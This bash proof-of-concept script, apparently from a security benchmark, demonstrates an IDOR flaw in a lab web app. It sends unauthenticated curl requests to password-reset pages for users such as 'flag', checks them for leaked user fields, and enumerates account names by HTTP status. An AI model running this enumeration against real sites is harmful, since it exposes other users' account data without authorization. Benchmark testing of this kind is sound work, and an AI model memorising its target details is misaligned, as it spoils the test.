#!/bin/bash
# POC: Demonstrates IDOR vulnerability by accessing password reset forms for multiple users without authentication
# Target: ./repo
# Created: 2025-11-04T17:32:38.919Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# IDOR Vulnerability POC - Unauthorized Access to Password Forms

TARGET_URL="${1:-http://localhost:8000}"

echo "[*] IDOR POC: Unauthorized Access to Password Forms"
echo "[*] Target: $TARGET_URL"
echo ""

# Test accessing password form for user "test"
echo "[+] Testing access to password form for user test:"
RESPONSE_TEST=$(curl -s -w "\n%{http_code}" "$TARGET_URL/password/test")
HTTP_CODE_TEST=$(echo "$RESPONSE_TEST" | tail -n 1)
BODY_TEST=$(echo "$RESPONSE_TEST" | sed '$d')

echo "    HTTP Status: $HTTP_CODE_TEST"
if [ "$HTTP_CODE_TEST" == "200" ]; then
    echo "    SUCCESS: Accessed /password/test without authentication"
    if echo "$BODY_TEST" | grep -q "user_id"; then
        echo "    SUCCESS: Response contains user_id field"
    fi
    if echo "$BODY_TEST" | grep -q "username"; then
        echo "    SUCCESS: Response contains username field"
    fi
else
    echo "    FAILED: Access denied with HTTP $HTTP_CODE_TEST"
fi
echo ""

# Test accessing password form for user "flag"
echo "[+] Testing access to password form for user flag:"
RESPONSE_FLAG=$(curl -s -w "\n%{http_code}" "$TARGET_URL/password/flag")
HTTP_CODE_FLAG=$(echo "$RESPONSE_FLAG" | tail -n 1)
BODY_FLAG=$(echo "$RESPONSE_FLAG" | sed '$d')

echo "    HTTP Status: $HTTP_CODE_FLAG"
if [ "$HTTP_CODE_FLAG" == "200" ]; then
    echo "    SUCCESS: Accessed /password/flag without authentication"
    if echo "$BODY_FLAG" | grep -q "user_id"; then
        echo "    SUCCESS: Response contains user_id field"
    fi
    if echo "$BODY_FLAG" | grep -q "username"; then
        echo "    SUCCESS: Response contains username field"
    fi
else
    echo "    FAILED: Access denied with HTTP $HTTP_CODE_FLAG"
fi
echo ""

# Test with enumerated usernames
echo "[+] Testing account enumeration via password endpoint:"
for username in admin user1 user2 guest; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/password/$username")
    echo "    /password/$username: HTTP $HTTP_CODE"
done
echo ""

echo "[!] VULNERABILITY SUMMARY:"
if [ "$HTTP_CODE_TEST" == "200" ] && [ "$HTTP_CODE_FLAG" == "200" ]; then
    echo "    CONFIRMED: IDOR vulnerability - unauthenticated access to password forms"
    echo "    CONFIRMED: Multiple user accounts are accessible"
    echo "    CONFIRMED: Sensitive information exposed"
else
    echo "    NOTE: Could not fully reproduce IDOR vulnerability"
fi